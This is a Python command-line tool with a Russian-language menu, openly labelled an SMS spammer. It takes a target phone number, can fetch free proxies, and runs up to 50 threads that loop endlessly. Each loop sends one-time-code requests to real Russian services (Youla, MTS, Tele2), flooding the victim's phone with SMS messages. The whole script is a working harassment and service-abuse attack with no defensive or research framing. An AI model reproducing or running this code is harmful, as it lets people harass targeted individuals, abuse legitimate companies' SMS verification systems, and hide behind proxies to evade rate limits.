#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from os import name, system
from os.path import exists, isfile
from random import choice, randint
from threading import Thread
from time import sleep
from colorama import Fore, Style
from requests import get, post
from user_agent import generate_user_agent


def banner():
    system("cls" if name == "nt" else "clear")
    print(BRIGHT + GREEN)
    
    print(f"{GREEN} ⣿⣿⣿⠿⠻⠛⠛⠻⢿⣿      ___ ___  _   __  __ __  __ ___ ___  ")
    print(f"{GREEN}⣿⣿⠁⠄⠄⠄⠄⠄⠄⠘⣿⣿    / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
    print(f"{GREEN}⣿⣿⡀⢠⣶⡆⢠⣶⡄⢀⣿⣿    \__ \  _/ _ \| |\/| | |\/| | _||   / ")
    print(f"{GREEN}⣿⣿⣋⡈⠉⠡⠎⠉⠁⣈⣿⣿    |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
    print(f"{GREEN}⢿⣿⣿⡏⢦⣀⣀⣠⢪⣿⣿⡿                                   {RED}by A1Ex@")
    print(f"{GREEN} ⠙⠿⣷⣌⠉⠉⢁⣾⡿⠟                                           ")                                                     
    print(RESET_ALL)


def main():
    banner()
    print()
    print("                          [1] СМС СПАМЕР")
    print("                            [2] ВЫХОД")
    print()
    select = input(f"{BRIGHT}{BLUE}Введите номер пункта: {RESET_ALL}")
    if select == "1":
        spam_handler()
    elif select == "2":
        print()
        exit()
    else:
        print(f"\n{BRIGHT}{RED}[*] Номер пункта введён неверно!{RESET_ALL}")
        sleep(1)
        main()


def spam_handler():
    check_internet()
    banner()
    print("Введите номер телефона")
    phone = parse_phone(input(f"{BRIGHT}{BLUE}spammer >> {RESET_ALL}"))
    print()
    print("Использовать прокси? (y/n)")
    proxy = input(f"{BRIGHT}{BLUE}spammer >> {RESET_ALL}")
    if proxy.lower() == "y":
        proxies = generate_proxy()
    else:
        proxies = None
    print()
    print("Введите кол-во потоков")
    threads = input(f"{BRIGHT}{BLUE}spammer >> {RESET_ALL}")
    if threads in ["", " ", "0"]:
        threads = "1"
    try:
        if int(threads) > 50:
            threads = "50"
    except ValueError:
        threads = "1"
    banner()
    print(f"Телефон: {BRIGHT}{BLUE}{phone}{RESET_ALL}")
    print("Спамер запущен", end="\n")
    print(f"{BRIGHT}{RED}[*] Ctrl+Z для остановки{RESET_ALL}")
    for _ in range(int(threads)):
        Thread(target=start_spam, args=(phone, proxies)).start()


def start_spam(phone, proxies):
    def format_phone(phone, phone_mask):
        phone_list = list(phone)
        for i in phone_list:
            phone_mask = phone_mask.replace("#", i, 1)
        return phone_mask

    name = ""
    for _ in range(12):
        name += choice("123456789zxcbearmed")
        password = name + choice("123456789bearmedzxc")
        email = name + "@gmail.com"
    phone9 = phone[1:]
    headers = {"User-Agent": generate_user_agent()}
    while True:
    
        try:
            post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, headers=headers, proxies=proxies)
        except:
            pass
        try:
            post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone}, headers=headers, proxies=proxies)
        except:
           pass
        try:
           post(f"https://msk.tele2.ru/api/validation/number/{phone}", json={"sender": "Tele2"}, headers=headers, proxies=proxies)
        except:
            pass
            
            
            
def parse_phone(phone):
    if phone in ["", " "]:
        main()
    if len(phone) in [10, 11, 12]:
        if phone[0] == "+":
            phone = phone[1:]
        elif phone[0] == "8":
            phone = "7" + phone[1:]
        elif phone[0] == "9":
            phone = "7" + phone
        return phone
    else:
        print(f"\n{BRIGHT}{RED}[*] Номер телефона введён неверно!{RESET_ALL}")
        sleep(1)
        spam_handler()


def generate_proxy():
    proxy = get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    return {"http": proxy, "https": proxy}


def check_internet():
    try:
        get("http://google.com", timeout=1)
    except Exception:
        print(f"\n{BRIGHT}{RED}[*] Нет подключения к интернету!{RESET_ALL}")
        sleep(1)
        main()
    return






GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED
BRIGHT = Style.BRIGHT
RESET_ALL = Style.RESET_ALL

if __name__ == "__main__":
    main()
